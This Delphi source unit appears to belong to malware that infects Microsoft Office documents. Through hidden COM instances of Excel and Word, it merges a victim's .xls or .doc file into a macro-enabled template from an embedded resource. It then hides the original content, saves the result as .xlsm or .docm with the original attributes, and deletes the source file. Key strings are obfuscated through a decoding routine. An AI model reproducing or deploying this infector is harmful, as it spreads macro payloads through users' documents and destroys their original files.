unit FIO;

interface

uses
  Windows, Classes, SysUtils, Variants, Comobj, uTypes, uFnc, uEnc;

type
  TFIO = class(TComponent)
  private
    ConfigData: TCnfg;
    EI: OleVariant;
    WI: OleVariant;
    procedure StopIns();
    procedure PrcEx(FPath: string);
    procedure PrcWo(FPath: string);
  public
    constructor Create(AOwner: TComponent; Config: TCnfg);
    procedure InFi(FPath: string);
    procedure InFis(Files: TStringList);
  end;

implementation

constructor TFIO.Create(AOwner: TComponent; Config: TCnfg);
begin
  inherited Create(Owner);
  ConfigData := Config;
end; { Constructor -> Set Default Variable }

{****************************************************************************
                      Custom Functions
****************************************************************************}

procedure TFIO.StopIns();
begin
  // Destroy Excel Instance & Delete Cache
  if not VarIsClear(EI) then begin
    EI.Quit;
    EI := Unassigned;
  end;

  // Destroy Word Instance & Delete Cache
  if not VarIsClear(WI) then begin
    WI.Quit;
    WI := Unassigned;
  end;
end; { EStart -> Start Excel Instance }

procedure TFIO.PrcEx(FPath: string);
var
  I, Count: Integer;
  CFile, CName: string;
begin
  if ConfigData.iEx then
  try
    // Run Excel Instance
    if VarIsClear(EI) then begin
      EI := CreateOleObject(DE('MNjr/ckiJ/ExMUw6LyM+uzD'));
      EI.DisplayAlerts := False;
      EI.EnableEvents := False;
      EI.Visible := False;
    end;

    // Create XLSM File
    CFile := GtTeD + '\' + GtRanStr(5) + DE('n4gyleE');
    CName := ExtractFileName(CFile);
    RsSaToFi(ConfigData.ExRsNa, CFile, True);

    // Open Inj File
    EI.Workbooks.Close;
    EI.Workbooks.Open(CFile, EmptyParam, False);
    EI.Workbooks.Open(FPath, EmptyParam, True);

    // Copy Pages
    EI.Workbooks[ExtractFileName(FPath)].Worksheets.Copy(EI.Workbooks[CName].Worksheets[1]);

    // Select Last Item
    EI.Workbooks[CName].Activate;
    Count := EI.Workbooks[CName].Worksheets.Count;
    if Count > 1 then
      EI.Workbooks[CName].Worksheets[Count].Name := 'Sheets  1';

    // Hide Pages
    for I := 1 to Count - 1 do
      EI.Workbooks[CName].Worksheets[I].Visible := False;

    // Save & Close
    EI.Workbooks[CName].Save;
    EI.Workbooks[ExtractFileName(FPath)].Close;
    EI.Workbooks.Close;

    // Dosyayý Sil & Kopyala
    CyFiRstPer(CFile, ChangeFileExt(FPath, DE('n4gyleE')), 128);
    DeleteFile(FPath);
    DeleteFile(CFile);
  except
    EI.Workbooks.Close;
  end;
end; { ProcessExcel -> Excel File Injection }

procedure TFIO.PrcWo(FPath: string);
var
  I: Integer;
  CFile: string;
  CDoc: Variant;
begin
  if ConfigData.iWo then
  try
    // Run Word Instance
    if VarIsClear(WI) then begin
      WI := CreateOleObject(DE('eBq/7+BFgGYFfU0XYRouIC'));
      WI.DisplayAlerts := False;
      WI.Visible := False;
    end;

    // Create DOCM File
    CFile := GtTeD + '\' + GtRanStr(5) + DE('nIBsq0C');
    RsSaToFi(ConfigData.WoRsNa, CFile, True);

    // Copy Pages
    WI.Documents.Open(CFile, EmptyParam, False);
    WI.ActiveDocument.Merge(FPath, 1, False);
    WI.ActiveDocument.AcceptAllRevisions;
    WI.ActiveDocument.Content.Font.Hidden := True;

    // Save & Close
    WI.ActiveDocument.Save;
    WI.ActiveDocument.Close(False);

    // Dosyayý Sil & Kopyala
    CyFiRstPer(CFile, ChangeFileExt(FPath, DE('nIBsq0C')), 128);
    DeleteFile(FPath);
    DeleteFile(CFile);
  except
    WI.ActiveDocument.Close;
  end;
end; { ProcessExcel -> Excel File Injection }

{****************************************************************************
                      Public Injection Process
****************************************************************************}

procedure TFIO.InFi(FPath: string);
var
  Buffer: TStringList;
begin
  Buffer := TStringList.Create;
  Buffer.Add(FPath);
  InFis(Buffer);
  Buffer.Free;
end; {* InjFile -> Inject One File *}

procedure TFIO.InFis(Files: TStringList);
var
  i: Integer;
  ex,wo : String;
begin
  // Set Office Installed Status
  ConfigData.iEx := iOObj(DE('MNjr/ckiJ/ExMUw6LyM+uzD'));
  ConfigData.iWo := iOObj(DE('eBq/7+BFgGYFfU0XYRouIC'));

  ex := DE('1VHue2rNDMCOfmM'); // |.xls|.xlsx
  wo := DE('1VHp969pxegLuYG'); // |.doc|.docx

  if Files.Count >= 1 then
  try
    for i := 0 to Files.Count - 1 do begin
      if (Pos(ExtractFileExt(Files.Strings[i]), ex) > 0) and (FileExists(Files.Strings[i])) then
        PrcEx(Files.Strings[i])
      else if (Pos(ExtractFileExt(Files.Strings[i]), wo) > 0) and (FileExists(Files.Strings[i])) then
        PrcWo(Files.Strings[i]);
    end;
  finally
    StopIns;
  end;
end; {* InjFiles -> Inject File List *}

end.

